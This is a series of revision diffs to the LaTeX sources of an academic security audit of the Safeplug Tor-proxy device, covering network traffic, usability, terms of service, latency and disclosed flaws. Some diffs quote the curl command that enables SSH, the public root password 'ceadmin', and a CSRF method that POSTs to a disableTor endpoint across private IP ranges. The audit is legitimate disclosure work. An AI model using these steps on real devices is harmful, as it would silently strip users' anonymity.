+This would occur silently from the perspective of a client unless they happen to check the Settings page for the Safeplug.
 Instead, the client would continue browsing with a belief that they are protected by their use of the Tor network, while in fact any external adversary can track their traffic.
@@
 \begin{enumerate}
-\item Set up a web page with the crafted Javascript code, which will send a POST request of the following format to all addresses in the range: \url{http://<IP address>/svc/xspctrl/disableTor} (See Appendix \ref{App:AppendixA}).
+\item Set up a web page with the crafted Javascript code, which will send the POST request of the following format to all addresses in the common ranges: \url{http://<IP address>/svc/xspctrl/disableTor} (See Appendix \ref{App:AppendixA}).
 \item Send the malicious link to a user in the targeted private network.
@@
 This exploits the RPC server in the same manner that the Insider Attack does.
-While this attack requires a greater amount of time because the local IP address of the Safeplug must be guessed via search, but the number of private address spaces is small, and the space likely to be occupied by a Safeplug on a home network is even smaller.
+While this attack requires a greater amount of time because the local IP address of the Safeplug must be guessed via search, the number of private address spaces is small, and the space likely to be occupied by a Safeplug on a home network is even smaller.
 
-The largest observed time to send requests to the 192.168.0.0/24 space was ~400 milliseconds; the entire attack costs ~800 milliseconds for sending request to both 192.168.0.0/24 and 192.168.1.0/24 ranges - even when the website was being loaded over Tor.
+The largest observed time to send requests to the 192.168.0.0/24 space was approximately 400 milliseconds; the entire attack costs approximately 800 milliseconds for sending request to both 192.168.0.0/24 and 192.168.1.0/24 ranges - even when the website was being loaded over Tor.
 In the case of a private network in the range of 172.16.0.0/16, the attack took less than ~12 minutes (this generates script timeout warnings in most major browsers, which affects the timing of this attack).
@@
 This whitelist attack is particularly dangerous because the change is silent and much harder for the user to notice the addition of a single website to the whitelist than a global loss of Tor.
-(Removal of a webpage from the whitelist is likely to to cause usability problems and be more evident.)
+(Removal of a webpage from the whitelist is likely to cause usability problems and be more evident.)
 
@@
 \label{sec:SSH}
-    \subsubsection{Accessing the Device}
     Safeplug runs an RPC server that allows the enabling of SSH access via HTTP.
-SSH instructions for Cloud Engine's other device (Pogoplug) are widely available online and an email in the Tor-talk mailing list confirms that the instructions are the same (although the Pogoplug support staff note that SSH access breaks the warranty!) \cite{ceadmin}:
+SSH instructions for Cloud Engine's other device (Pogoplug) are widely available online and an email in the Tor-talk mailing list confirms that the instructions are the same \cite{ceadmin}:
 \begin{fileName}

### 2014-02-11 report/related.tex
made minor edits

@@
 However there has been much prior research on the primary technology that the device uses: Tor.
-Additionally, the security goals that Safeplug attempts to achieve have been previously studied in great detail; these include fingerprinting and cookies.
+Additionally, the security vulnerabilities that Safeplug attempts to secure users against have been previously studied in great detail; these include fingerprinting and cookies.
 
@@
 
-{\bf Fingerprinting.}  Website fingerprinting attacks as well as remote physical device fingerprinting attacks have shown they can identify users, even when specific defense have been used in order to prevent these attacks.
+{\bf Fingerprinting.}  Website fingerprinting attacks as well as remote physical device fingerprinting attacks have shown they can identify users, even when specific defenses have been used in order to prevent these attacks.
 Previous research has shown that web page fingerprinting attacks are possible~\cite{dyer, herrmann, panchenko}.
@@
 These results can be extended to the security of Safeplug.
-Because Safeplug uses only Tor to anonymize users, it may be susceptible to this fingerprinting attack.
+Because Safeplug uses only Tor to anonymize users, it may be susceptible to this type of fingerprinting attack.
 

### 2014-02-11 report/usability.tex
made minor edits

@@
 
-Before setting up and using the Safeplug device, we read a variety of news articles as well as opinions through the Tor mailing list~\cite{tormailinglist}.
+Many news articles were published to announce the release of the Safeplug in addition to a lengthy discussion on the Tor-talk mailing list~\cite{tormailinglist}.
 There were many thoughts on the Terms of Service and the option to use the device as a Tor relay node; this inspired us to start our analysis with these items.
@@
 \label{tos}
-Safeplug's Terms of Service are interesting because they are controlling, yet the product they are for is a device for anonymization.
 The first section of the Terms of Service explains how to agree to them:
@@
 It is also interesting that these Terms of Service are only accessible through a small link at the bottom of the Safeplug website \cite{safeplug}; specifically, there is no documentation, including the Terms of Service, in the package that the device was shipped in.
-Further along in the Terms of Service, the makers of Safeplug were sloppy when they wrote:
+The Terms of Service next includes:
 
@@
 
-One of our concerns is how understandable this setting is to the average Internet user.
-The settings page describes Tor in an extremely basic way, as shown in Figure~\ref{fig:funnydesc}, but describes the functionality of a Tor relay node in a much more technical manner.
+One of our concerns is how understandable this setting is to the average Internet user.  The settings page describes Tor in an extremely basic way:
+
+\begin{quotation}
+``Safeplug uses the Tor network to secure your Internet connection.
+Tor works by routing your Internet through a series of random destinations, much like driving a twisty, complicated route to throw off someone who is following you, making it impossible for websites and organizations to identify the source or destination of Internet traffic.'' \cite{safeplug}
+\end{quotation}
+
+On the other hand, it describes the functionality of a Tor relay node in a much more technical manner.
 This description is shown in Figure~\ref{fig:relaydesc}.
@@
 Our instructions are shown in Figure~\ref{fig:instructions}.
-We followed them, activated our device, and then ended on the configuration page.
-The configuration page has a combination of platforms and browsers, with a different set of proxy configuration instructions for each one.
+We followed them, activated our device, and then ended on the configurations page.
+The configurations page has a combination of platforms and browsers, with a different set of proxy configuration instructions for each one.
 It is interesting to note that the only platform options were: OSX, Windows, Android, and iOS.
@@
 
-After we finished our configuration, we were taken to our settings.
+After we finished our configuration, we were taken to our settings page.
 This page is shown in Figure~\ref{fig:settings}.
-This allowed us to turn on/off Tor, add white-listed websites, turn on/off ad-blocking, and turn on/off the ability of our device to be a relay node.
+This allowed us to turn Tor on/off, add white-listed websites, turn ad-blocking on/off, and turn the ability of our device to be a relay node on/off.
 
@@
 While browsing the Internet, we experienced some pages in German and Swedish, which is expected with Tor; if a user is not familiar with Tor, then they may just get frustrated and stop using Safeplug altogether.
-We were also prompted with the page in Figure~\ref{fig:funnygoogle} when we tried to log into our Google account.
+We were also prompted with the page in Figure~\ref{fig:funnygoogle} when we tried to log into our Google account, indicating that Google noticed we were trying to login from different locations.
 
@@
 These included cookies from: abmr.net, bizographics.com, krxd.net, and bluekai.com among many others.
+
+\subsection{Latency}
+This is a todo item for Annie.

### 2014-02-12 report/design.tex
rearranged sections

@@
 
-\subsubsection{Initial Plugin Behavior}
-Before allowing the Safeplug box to be connected to the outside world, we attached it to a home connection setup formed by a computer with two network cards and then captured traffic both inside that network and between the network and the internet.
-The internal network card was connected to a Netgear switch and served as a gateway, DHCP server, and DNS server.
-The other card was the connection to the internet.
-We used Wireshark to analyze the network data that we captured \cite{wireshark}.
-
-Analysis of the TCP dump showed that the Safeplug box repeatedly queried the local DNS server for two items: the NIST standardized time and \url{pogoplug.com}.
-The first query for the time was to \url{www.nist.gov}, and subsequent queries included \url{nist1-chi.ustiming.org}, \url{nist1-ny.ustiming.org}, \url{time-nw.nist.gov}, and \url{nist1.symmetricom.com}.
-Queries about pogoplug were mostly for \url{service.pogoplug.com}, but \url{secure.pogoplug.com} was attempted once.
-While it was connected to the local network, we also did a scan of all the ports of the Safeplug and only port 80 was open.
-
-\subsubsection{Activation and Update Traffic}
-\label{updatetraf}
-After establishing the initial update behavior, we connected the other end of our router back to the internet and captured traffic on both of the network interfaces.
-As we had seen previously, the first effort of the Safeplug was to query for \url{service.pogoplug.com} and connect, and then send a POST/XML request to that server containing a 16 byte numerical string of type \verb!nid!, \verb!0x0!
-as \verb!flags!, and a field called \verb!pingdata!
-with length of 423 bytes and undiscernable contents.
-
-The client computer then navigated to the Pogoplug website to complete the activation process.
-Each step of the process resulted in both TCP and UDP traffic between the Safeplug box and the Pogoplug servers.
-Most interesting was the update step in which the Safeplug box knew to request a script from \url{<update server IP>/svc/upgrade/safeplug\_switch.sh}.
-Since this operation occured over normal HTTP, we were able to use \verb!curl!
-to recover the same script and examine it to discover the contents of the upgrade.
-
-The upgrade script shows (and the network traffic confirms) that the box downloads and installs the following \verb!.tgz! files: 
-\begin{fileName}
-safeplug_lighttpd, safeplug_lighttpd_config, safeplug_wget, safeplug_certs, safeplug_gohelper, safeplug_tor, safeplug_tor_config, safeplug_privoxy, safeplug_privoxy_config
-\end{fileName}
-  Each file is compared to an MD5 hash before being unzipped and installed.
-Details about the software found on the Safeplug are discussed in Section \ref{software}.
-After the safeplug\_lighttpd and safeplug\_lighttpd\_config installations, a process called \verb!hbplug!
-is killed and lighttpd is started.
-After the certs are downloaded, the current \verb!/usr/local/ssl!
-is overwritten with the new certs.
-The \verb!go\_helper!
-is added to the \verb!/opt/xce/sbin!
-folder, and contains binary files with names related to update and upgrade.
-
-After completing the installations, a default Safeplug configuation file is written with use of Tor set to 1.
-More information about the configuration is in Section \ref{spconfig}.
-Finally, the old \verb!rcS!
-file in \verb!/etc/init.d!
-is replaced with commands to start lighttpd, tor and privoxy, and the LED on the front of the device is set to green after the completion of the upgrade.
-This means that the green LED indicates an up-to-date, internet-connected Safeplug, rather than anything about the use of TOR.
-
-\subsubsection{Traffic After Activation}
-After the activation and the configuration of the Safeplug as a proxy, all traffic runs through the Tor network.
-The Safeplug connected to a directory to learn about different relays and seemed to cycle through a small set around the world for different connections.
-This demonstrates that Tor is working as expected.
-If there is any ``phone-home'' being done by the device after Tor has been turned on, then it is doing so through the Tor network.
-
 \subsubsection{Software on the Safeplug}
@@
 file to set which Tor configuration file (regular, relay or exit relay) to use.
+
+\subsubsection{Activation and Setup}
+The first step was to plug Safeplug into our router and activate our device.
+Our instructions are shown in Figure~\ref{fig:instructions}.
+We followed them, activated our device, and then ended on the configurations page.
+The configurations page has a combination of platforms and browsers, with a different set of proxy configuration instructions for each one.
+It is interesting to note that the only platform options were: OSX, Windows, Android, and iOS.
+Figure~\ref{fig:proxyconfig} shows our configuration.
+
+\begin{figure}[t]
+\begin{center}
+\includegraphics[width=.75\textwidth]{instructions}
+\caption{Configuration instructions.}
+\label{fig:instructions}
+\end{center}
+\end{figure}
+
+\begin{figure}[t]
+\begin{center}
+\includegraphics[width=.75\textwidth]{proxyconfig}
+\caption{Proxy Configuration.}
+\label{fig:proxyconfig}
+\end{center}
+\end{figure}
+
+After we finished our configuration, we were taken to our settings page.
+This page is shown in Figure~\ref{fig:settings}.
+This allowed us to turn Tor on/off, add white-listed websites, turn ad-blocking on/off, and turn the ability of our device to be a relay node on/off.
+
+\begin{figure}[htb]
+\begin{center}
+\includegraphics[width=.75\textwidth]{settings}
+\caption{Settings page.}
+\label{fig:settings}
+\end{center}
+\end{figure}

### 2014-02-12 report/old.tex
rearranged sections

--- 2014-01-14 resultsSoftware.tex
@@
-\subsection{Traffic Analysis}
-\label{sec:traffic}
+\subsubsection{Initial Plugin Behavior}
+Before allowing the Safeplug box to be connected to the outside world, we attached it to a home connection setup formed by a computer with two network cards and then captured traffic both inside that network and between the network and the internet.
+The internal network card was connected to a Netgear switch and served as a gateway, DHCP server, and DNS server.
+The other card was the connection to the internet.
+We used Wireshark to analyze the network data that we captured \cite{wireshark}.
 
-\subsubsection{Initial Plugin Behavior}
-Before allowing the Safeplug box to be connected to the outside world, we attached it to the home connection setup described in Section \ref{sec:proc} and captured traffic for a few minutes on the local network.
-From visual inspection (Figure \ref{redlight}), there was certainly something trying to access the internet and displaying an error on its failure.
-
-\begin{figure}[htb]
-        \centering
-        \begin{subfigure}[b]{0.3\textwidth}
-                \includegraphics[width=\textwidth]{redlight.jpg}
-                \caption{Safeplug box when only connected to the local network.}
-                \label{redlight}
-        \end{subfigure}%
-        \quad %add desired spacing between images, e. g. ~, \quad, \qquad etc.
-          %(or a blank line to force the subfigure onto a new line)
-        \begin{subfigure}[b]{0.4\textwidth}
-          \centering
-          \includegraphics[width=.66\textwidth,angle=180]{greenlight.jpg}
-                \caption{Safeplug box after connection to the internet, regardless of whether Tor was enabled.}
-                \label{greenlight}
-        \end{subfigure}
-        \caption{Safeplug box during initial setup prior to an internet connection and after activation from the Pogoplug website.}
-        \label{fig:lights}
-\end{figure}
-
-Analysis of the TCP dump showed that the Safeplug box repeatedly queried the local DNS server for two items: \url{pogoplug.com} and the NIST standardized time.
+Analysis of the TCP dump showed that the Safeplug box repeatedly queried the local DNS server for two items: the NIST standardized time and \url{pogoplug.com}.
 The first query for the time was to \url{www.nist.gov}, and subsequent queries included \url{nist1-chi.ustiming.org}, \url{nist1-ny.ustiming.org}, \url{time-nw.nist.gov}, and \url{nist1.symmetricom.com}.
-Queries about pogoplug were mostly for \url{service.pogoplug.com} but after that set was tried \url{secure.pogoplug.com} was attempted once.
-While it was only connected to the local network, we also did a scan of all the ports of the Safeplug and only port 80 was open.
+Queries about pogoplug were mostly for \url{service.pogoplug.com}, but \url{secure.pogoplug.com} was attempted once.
+While it was connected to the local network, we also did a scan of all the ports of the Safeplug and only port 80 was open.
 
@@
 is added to the \verb!/opt/xce/sbin!
-folder, and contains binary files with names related to update and upgrade (which we hope to decompile in future work).
+folder, and contains binary files with names related to update and upgrade.
 
 After completing the installations, a default Safeplug configuation file is written with use of Tor set to 1.
-(More information about the configuration in Section \ref{spconfig}.)  Finally, the old \verb!rcS!
+More information about the configuration is in Section \ref{spconfig}.
+Finally, the old \verb!rcS!
 file in \verb!/etc/init.d!
-is replaced with commands to start lighttpd, tor and privoxy, and the LED is set to green as shown in Figure \ref{greenlight} after the completion of the upgrade.
+is replaced with commands to start lighttpd, tor and privoxy, and the LED on the front of the device is set to green after the completion of the upgrade.
 This means that the green LED indicates an up-to-date, internet-connected Safeplug, rather than anything about the use of TOR.
@@
 If there is any ``phone-home'' being done by the device after Tor has been turned on, then it is doing so through the Tor network.
-
-\subsection{Gaining Access through SSH}
-\label{sec:SSH}
-    \subsubsection{Accessing the Device}
-    Safeplug runs an RPC server that allows the enabling of SSH access via HTTP.
-SSH instructions for Cloud Engine's other device (Pogoplug) are widely available online and an email in the Tor-talk mailing list confirms that the instructions are the same (although the Pogoplug support staff note that SSH access breaks the warranty!) \cite{ceadmin}:
-\begin{fileName}
-curl --data ``'' http://<IP-of-Safeplug>/svc/xspctrl/enableSSHD
-ssh root@<IP-of-Safeplug>
-password: ceadmin
-\end{fileName}
-
-Obviously having a publically available root password means that SSH can be done effectively without authentication.
-We tried the SSH procedure twice, once before the internet connection and activation, and once afterwards.
-Before the activation and update procedure, SSH was not available.
-The simple \verb!Hbplug!
-software on the box could not accept this RPC call.
-However, once the box was updated and had lighttpd installed, the SSH procedure was available and we could download the contents of the root filesystem for analysis.
-
-    \subsubsection{Software on the Safeplug}
-\label{software}
-As would be suspected from the analysis of the update script described above in Section \ref{updatetraf}, the installed software is in \verb!/opt/xce!
-and includes lighttpd, privoxy, and tor.
-Lighttpd is an open-source webserver, which is serving the settings page on the device - the project's description mentions ``security, speed, compliance, and flexibility [...
-while being] designed and optimized for high perfomance environments'' \cite{lighttpd}.
-Privoxy is a ``non-caching web proxy with advanced filtering capabilities for enhancing privacy, modifying webpage data and HTTP headers, controlling access, and removnig ads and other obnoxious Internet junk'' and it specifically advertises its ``flexible configuration'' \cite{privoxy}.
-Privoxy is also open source.
-All three pieces of software appear to be there with default configuration files (with all appropriate citations and comments present).
-The Safeplug uses its own configuration files to determine how these pieces of software are set up and used.
-
-    \subsubsection{Configuration on the Safeplug}
-    \label{spconfig}
-The Safeplug configuration files can be found in \verb!/opt/xce/etc!
-and include \verb!sp.conf!
-and \verb!sp_version!
-and \verb!sp_torexceptions!.
-The first contains all of the important details from the configuration page (whether to use Tor, whether to be a relay, whether to adblock) as well as a hidden option about whether to be an exitrelay for the Tor network.
-This is not documented anywhere on the site, so enabling this option would likely require SSH access to discover it, thereby breaking the warranty, but it is interesting that this option is available.
-The version file is likely used for updates, and the exceptions file is used by the privoxy configuation to control the whitelist of sites not to connect to via Tor.
-
-These configuration files are read by the scripts in \verb!/opt/xce/etc/init.d!
-which enable lighttpd, privoxy, and tor.
-As expected, Privoxy looks at the Tor, adblock and exceptions configurations, and Tor reads the \verb!sp.conf!
-file to set which Tor configuration file (regular, relay or exitrelay) to use.
-
-\subsection{Attacking the RPC Capability}
-As we discovered while enabling SSH, the Safeplug has a remote procedure call (RPC) capability.
-This is a script called \verb!xspctrl!
-found in \verb!/opt/xce/html/svc!
-and it contains more options than just SSH enabling.
-Particularly, functional calls to this script include enable and disable for all of the Safeplug settings, including Tor, ad block, and Tor relay.
-None of them require any arguments in the POST string.
-
-\begin{figure}[htb]
-\begin{center}
-\includegraphics[width=.75\textwidth]{disabletor}
-\caption{Disabling Tor as an insider attack.}
-\label{disable}
-\end{center}
-\end{figure}
-
-\subsubsection{Insider Attack}
-Since the RPC server does not perform any kind of validation or authentication on the settings strings, it would be easy for anyone inside the local network to send a command and change the settings, for example to disable Tor or adblocking.
-All the attacker would need to know is the IP of the device.
-It does not even require SSH or discovering the (publically available) root password, or the user's new root password if they have been well-informed and adept enough to change it.
-Figure \ref{disable} shows an example of this attack.
-
-This attacker could also be any kind of device on the local network, or the local gateway if it is compromised.
-The NSA ``Spymall'' catalog leaked in December shows tools for compromising a number of different devices and home routers are traditionally insecure \cite{spymall}.
-It is easy to imagine any malicious party, not just one with the resources of a government, (although governments might be some of the most interested parties in attacking a Tor proxy) compromising the gateway and using that access make a disabling RPC call into the Safeplug.
-This would occur silently from the perspective of a client unless the happen to check the Settings page for the Safeplug.
-Instead, the client would continue browsing with a belief that they are protected by their use of the Tor network, while in fact any external adversary can track their traffic.
-
-This seems like a fairly important vulnerability and requires action from Pogoplug to fix.
-Since the purpose of these RPC operations is unclear without access to more of the source code, it is possible that they could be disabled entirely.
-If not, perhaps there is some authentication protocol that could be implemented.
-The challenge of such a protocol from a user's point of view is that valid access would be infrequent so giving a user a password to remember would be a poor experience.
-
-\subsubsection{Website Attack}
-We think it is also possible that an external website could perform this attack by returning the correctly formatted POST string.  Setting this up is future work.

### 2014-02-12 report/usability.tex
rearranged sections

@@
 \label{tos}
-The first section of the Terms of Service explains how to agree to them:
+The first section of the Terms of Service (TOS) explains how to agree to them:
 
@@
 This is worth noting because option b) described above did not exist in any part of the setup process for Safeplug.
-The Terms of Service continues by notifying readers that Pogoplug can change them any time they wish:
+The TOS continues by notifying readers that Pogoplug can change them any time they wish:
 
@@
 
-Most Safeplug users will likely not read the Terms of Service once, let alone on a regular basis; therefore, most users will be blind to any changes.
-It is also interesting that these Terms of Service are only accessible through a small link at the bottom of the Safeplug website \cite{safeplug}; specifically, there is no documentation, including the Terms of Service, in the package that the device was shipped in.
-The Terms of Service next includes:
+Most Safeplug users will likely not read the TOS once, let alone on a regular basis; therefore, most users will be blind to any changes.
+It is also interesting that these TOS are only accessible through a small link at the bottom of the Safeplug website \cite{safeplug}; specifically, there is no documentation, including the TOS, in the package that the device was shipped in.
+The TOS next includes:
 
@@
 This lack of attention to detail or respect for open source licenses does not put Pogoplug in a good light.
-In fact, the Tor mailing list noted this particularly, since Tor is an open source project \cite{tormailinglist}.
-The last section of the Terms of Service that stood out described Pogoplug's policy on updates:
+In fact, the Tor-talk mailing list noted this particularly, since Tor is an open source project \cite{tormailinglist}.
+The last section of the TOS that stood out described Pogoplug's policy on updates:
 
@@
 \label{inetuse}
-
-\subsubsection{Setting up Safeplug} The first step was to plug Safeplug into our router and activate our device.
-Our instructions are shown in Figure~\ref{fig:instructions}.
-We followed them, activated our device, and then ended on the configurations page.
-The configurations page has a combination of platforms and browsers, with a different set of proxy configuration instructions for each one.
-It is interesting to note that the only platform options were: OSX, Windows, Android, and iOS.
-Figure~\ref{fig:proxyconfig} shows our configuration.
-
-\begin{figure}[t]
-\begin{center}
-\includegraphics[width=.75\textwidth]{instructions}
-\caption{Configuration instructions.}
-\label{fig:instructions}
-\end{center}
-\end{figure}
-
-\begin{figure}[t]
-\begin{center}
-\includegraphics[width=.75\textwidth]{proxyconfig}
-\caption{Proxy Configuration.}
-\label{fig:proxyconfig}
-\end{center}
-\end{figure}
-
-After we finished our configuration, we were taken to our settings page.
-This page is shown in Figure~\ref{fig:settings}.
-This allowed us to turn Tor on/off, add white-listed websites, turn ad-blocking on/off, and turn the ability of our device to be a relay node on/off.
-
-\begin{figure}[htb]
-\begin{center}
-\includegraphics[width=.75\textwidth]{settings}
-\caption{Settings page.}
-\label{fig:settings}
-\end{center}
-\end{figure}
-
-\subsubsection{Using the Internet} Figure~\ref{fig:before} shows what a web page looks like before turning Tor and ad-blocking on, while Figure~\ref{fig:after} shows the same website after turning Tor and ad-blocking on.
+Figure~\ref{fig:before} shows what a web page looks like before turning Tor and ad-blocking on, while Figure~\ref{fig:after} shows the same website after turning Tor and ad-blocking on.
 Both of these figures show our IP address in the top right corner; due to the change in IP address we can see that our traffic is being routed through Tor.
@@
 \subsection{Latency}
-This is a todo item for Annie.
+This is a to do item for Annie.

### 2014-02-14 report/design.tex
Citation for CSRF prevention

@@
 \subsubsection{Software on the Safeplug}
-As would be suspected from the analysis of the update script described above in Section \ref{updatetraf}, the installed software is in \verb!/opt/xce!
+The software installed by the activation process on the Safeplug (it is not on the box prior to the activation) is in \verb!/opt/xce!
 and includes lighttpd, privoxy, and tor.

### 2014-02-14 report/discussion.tex
Citation for CSRF prevention

@@
 The most critical engineering fix is authentication in the POST calls to prevent the cross-site request forgery attack.
-A typical example is a cookie and a hidden form field set in the Settings page the Safeplug hosts; the cookie must be returned by the browser when making the POST request to the RPC server (CITE).
-Although someone doing a cross-site request forgery attack such as the one described above could get the cookie sent, if the cookie is set correctly, then the adversary would not be able to examine the contents of the cookie to determine what to put in the form field.
+A typical example is a cookie and a hidden form field set in the Settings page the Safeplug hosts; the cookie must be returned by the browser when making the POST request to the RPC server \cite{csrfdef}.
+Although someone doing a cross-site request forgery attack such as the one described above could get the cookie sent, because of the same-origin policy, the adversary would not be able to examine the contents of the cookie to determine what to put in the form field.
 

### 2014-02-17 report/abstract.tex
rearranged sections
First draft of an abstract

@@
-\section{Abstract}
-\label{sec:abstract}
-
-TODO: Annie
+\begin{abstract}
+We present the first public third-party security audit of Pogoplug's Safeplug device, which marketed ``complete security and anonymity online'' by using Tor technology to protect users' IP addresses.
+We examine the hardware, software, and network behavior of the Safeplug device, as well as the user experience in comparison to other forms of web browsing.
+Although the Safeplug appears to use Tor as advertised, lack of user education could easily allow users to be identified in ways that they might not expect.
+Furthermore, an engineering vulnerability in the Safeplug's settings commands would allow an adversary internal or external to user's home network to silently disable Tor or modify other Safeplug settings, which completely overrules the security claims of the device.
+Even if the engineering problem is fixed, the user experience challenges of this type of device make it inferior to the existing standard in anonymity methods, particularly the Tor Browser Bundle.
+\end{abstract}

### 2014-02-17 report/usability.tex
added graph
added description of latency

@@
 
-\subsection{Cookies}  While browsing the Internet, we logged into a Google Account in a tab, and then subsequently went to a website that had the Google+ logo in a different tab.
+\subsection{Cookies}  
+While browsing the Internet, we logged into a Google Account in a tab, and then subsequently went to a website that had the Google+ logo in a different tab.
 When we clicked on the Google+ logo, it remember who we are; so we can confirm that we still have first-party cookies.
@@
 \subsection{Latency}
-This is a to do item for Annie.
+If the latency of web requests using the Safeplug is noticeably longer than that of normal Internet use, users may be deterred from using the device.
+Similarly, if turning Tor on, but not ad-blocking, adds a significant time delay, the user may only turn on the ad-blocking feature (without Tor).
+We recorded the time for a web request on the following settings:
+
+\begin{itemize}
+\item Plain Firefox
+\item Firefox, no Tor, no ad-blocking
+\item Firefox, Tor, no ad-blocking
+\item Firefox, Tor, ad-blocking
+\item Firefox, no Tor, ad-blocking
+\item Tor Browser Bundle with Safeplug
+\item Tor Browser Bundle
+\end{itemize}
+
+For each of the settings, we took 20 measurements; Figure~\ref{fig:latency2} shows the average time of a web request on each of the specified settings for three different web pages.
+The differences between web pages can most likely be attributed to the amount of ads on the web page.
+
+It is interesting to note that the average web request time for accessing \url{www.washingtonpost.com} is greatest on the same settings that the average web request time for \url{www.google.com} is the least.
+This setting did not include ad-blocking, and therefore \url{www.washingtonpost.com} had to render each ad; \url{www.google.com} does not have any ads.
+This does not explain why the average latency was greater than the other settings for \url{www.washingtonpost.com}.
+
+We expected the average latency for the Tor Browser Bundle with the Safeplug to be uniformly greater than the average latency of the Tor Browser Bundle, however that was not the case.
+[Comment: do we have any reasons why this might have happened?]
+
+\begin{figure}[htb]
+\begin{center}
+\includegraphics[width=0.7\textwidth]{latency2}
+\caption{Latency of web requests.}
+\label{fig:latency2}
+\end{center}
+\end{figure}

### 2014-02-17 report/usability.tex
updated TOS section

@@
 \label{tos}
-The first section of the Terms of Service (TOS) explains how to agree to them:
+The Terms of Service (TOS) contains three main points of interest: TOS updates, open source licensing information, and software updates.
+
+\subsubsection{TOS updates} Pogoplug suggests that users consistently read the TOS becaues they can update or change them at anytime.
+Most Safeplug users will likely not read the TOS once, let alone on a regular basis; therefore, most users will be blind to any changes.
+It is also interesting that these TOS are only accessible through a small link at the bottom of the Safeplug website \cite{safeplug}; specifically, there is no documentation, including the TOS, in the package that the device was shipped in.
+
+\subsubsection{Open source licensing information}  There is a section that acknowledges the use of many open source components in the Safeplug device; this section includes the statement:
 
 \begin{quotation}
-``You must agree to these TOS before you can use the Service.
-You can agree to these TOS by: a) actually using the Service, or b) clicking a box that indicates you agree to the Service, where such a box is made available to you.'' \cite{safeplug}
-\end{quotation}
-
-This is worth noting because option b) described above did not exist in any part of the setup process for Safeplug.
-The TOS continues by notifying readers that Pogoplug can change them any time they wish:
-
-\begin{quotation}
-``Pogoplug may update or change these TOS from time to time and recommends that you review the TOS on a regular basis at www.pogoplug.com/safeplug.
-You understand and agree that your continued use of the Service after the TOS has changed constitutes your acceptance of the TOS as revised.
-'' \cite{safeplug}
-\end{quotation}
-
-Most Safeplug users will likely not read the TOS once, let alone on a regular basis; therefore, most users will be blind to any changes.
-It is also interesting that these TOS are only accessible through a small link at the bottom of the Safeplug website \cite{safeplug}; specifically, there is no documentation, including the TOS, in the package that the device was shipped in.
-The TOS next includes:
-
-\begin{quotation}
-``Pogoplug includes several open source components in the Software.
-You agree to abide by the terms of the relevant licenses, as may be updated by Pogoplug from time to time at http://pogoplug.com/home-en-developers-open-source.html.
-'' \cite{safeplug}
+``You agree to abide by the terms of the relevant licenses, as may be updated by Pogoplug from time to time at http://pogoplug.com/home-en-developers-open-source.html. '' \cite{safeplug}
 \end{quotation}
@@
 In fact, the Tor-talk mailing list noted this particularly, since Tor is an open source project \cite{tormailinglist}.
-The last section of the TOS that stood out described Pogoplug's policy on updates:
 
-\begin{quotation}
-``As part of the Service, you may from time to time receive updates to the Software from Pogoplug that may be automatically downloaded and installed to your applicable device.
-These updates may include bug fixes, security enhancements or improvements, or entirely new versions of the Software.
-You agree that Pogoplug may automatically deliver such updates to you as part of the Service.
-'' \cite{safeplug}
-\end{quotation}
-
+\subsubsection{Software updates} Not only can the TOS be updated at any time, so can the software on the device.
+These udpates will be ``automatically delivered'' to the user, but the user is not notified of these updates~\cite{safeplug}.
 This should raise a red flag for users because they may not know when the software in their device is being changed or what it is changing to.

### 2014-02-17 report/intro.tex
added TODO items in paper
finished related work and added items to bibliography
added graph
Slightly more lengthy intro

--- 2014-01-14 intro.tex
@@
 
-{\bf Tor.} Among the more computer-savvy Internet users, Tor is gaining popularity for this reason.
-Tor is a service that provides anonymous communication as an onion router; it also makes a tradeoff between anonymity, usability, and efficiency~\cite{tor}.
-While Tor provides some measure of anonymity, the average Internet user does not know about it or how it works.
+{\bf Tor.} The state-of-the-art in online anonymity technology is the open-source project Tor.
+Tor is a service that provides anonymous communication as an onion router; by encrypting internet traffic and sending it through layers of relays, a user can make it much more difficult to trace their internet use~\cite{tor}.
+Instead of appearing to come from a user's IP address, the traffic will reach the destination from one of the relays, that will have received the traffic from another relay, creating a chain back from when the user first sent their traffic to a relay.
+Tor is known as an onion router because each relay peels back one layer of encryption and no more, allowing it to send the traffic to the next destination but not allowing it to discover the origin or final recipient of the traffic.
+Tor is open-source software developed by the Tor Project~\cite{torproject}.
+Users of Tor are highly recommended to use it as part of the {\bf Tor Browser Bundle (TBB)}, which provides a single installation of a browser and the Tor software package.
+This browser has special settings to prevent deanonymization of the traffic by other means, such as cookies, supercookies, or scripts~\cite{torproject}.
+Using Tor or the Tor Browser Bundle provides a tradeoff between anonymity, usability, and efficiency.
+Sending traffic to these relays around the world slows down the traffic significantly, possibly degrading user experience for websites that load a lot of data or function in real-time.
+In addition, because the destination website will see the user's request as coming from a new, likely international IP address, websites such as banks that have location-based safeguards may deny users access to their sites.
+For many users around the world, these troubles are a worthwhile price for access to free and open internet, anonymous communications, and resisting censorship.
+However, one of the biggest reasons that Tor is not more widespread is that many Internet users do not know about Tor, how it works, or how they would be able to use it to become more anonymous online.
 
 {\bf Safeplug.} Safeplug is a product that launched in December of 2013 from the cloud storage company Pogoplug, that offers any user the option of using Tor without having to know about it or how it works.
-It allows users to browse the web with “complete security and anonymity” for the cheap price of \$49 \cite{safeplug}.
+It allows users to browse the web from their own standard web browser with “complete security and anonymity” for the cheap price of \$49 \cite{safeplug}.
 Safeplug offers Tor out of the box, with no additional software installation, by sitting between a user’s router and the internet \cite{wired}.
 Pogoplug’s marketing pitch centers around the protection of user’s IP addresses by using Tor \cite{safeplug,bittech}.
+
+{\bf Pogoplug.} Pogoplug, a subsidary of Cloud Engines, also offers a box for home network file sharing without needing to use a third-party storage provider.
+Based on our examination of the box discussed below, we suspect that the Pogoplug box was relabelled as Safeplug and just uses different software to achieve its newly branded purpose.

### 2014-02-17 report/intro.tex
updated usability section

@@
 This browser has special settings to prevent deanonymization of the traffic by other means, such as cookies, supercookies, or scripts~\cite{torproject}.
+
 Using Tor or the Tor Browser Bundle provides a tradeoff between anonymity, usability, and efficiency.
-Sending traffic to these relays around the world slows down the traffic significantly, possibly degrading user experience for websites that load a lot of data or function in real-time.
+Sending traffic to these relays around the world slows down the traffic significantly, possibly degrading user experience for websites that load a lot of data in real-time.
 In addition, because the destination website will see the user's request as coming from a new, likely international IP address, websites such as banks that have location-based safeguards may deny users access to their sites.
@@
 It allows users to browse the web from their own standard web browser with “complete security and anonymity” for the cheap price of \$49 \cite{safeplug}.
-Safeplug offers Tor out of the box, with no additional software installation, by sitting between a user’s router and the internet \cite{wired}.
+Safeplug offers Tor out of the box, with no additional software installation, by sitting between a user's router and the internet \cite{wired}.
